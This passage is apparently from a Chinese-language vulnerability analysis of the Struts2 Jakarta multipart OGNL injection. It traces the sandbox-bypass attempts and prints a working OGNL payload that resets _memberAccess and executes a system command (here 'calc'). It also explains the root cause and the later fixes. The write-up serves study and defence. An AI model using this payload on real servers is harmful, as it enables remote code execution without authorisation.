尝试 clear() 清黑名单 → 硬编码检测还在 → 被拦
    ↓
尝试反射改 allowStaticMethodAccess → SecurityMemberAccess 在类黑名单 → 被拦
    ↓
最终方案：直接替换 _memberAccess 为 DEFAULT_MEMBER_ACCESS
    → isAccessible() 只检查 public/private 修饰符
    → public 方法全部放行
    → 弹计算器 ✓
```

### 最终 payload（沙箱绕过）

```java
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess=#dm).
(@java.lang.Runtime@getRuntime().exec('calc'))
```

**漏洞本质**：Jakarta multipart 解析器在解析失败时，会把包含用户可控数据的异常消息原封不动地传入 Struts2 国际化文本处理流程，而该流程会对所有文本内容进行 OGNL 求值，导致任意代码执行。防御上，Struts2 后续版本对 OGNL 求值入口做了更严格的输入过滤，并且不再对异常消息内容进行 OGNL 处理。
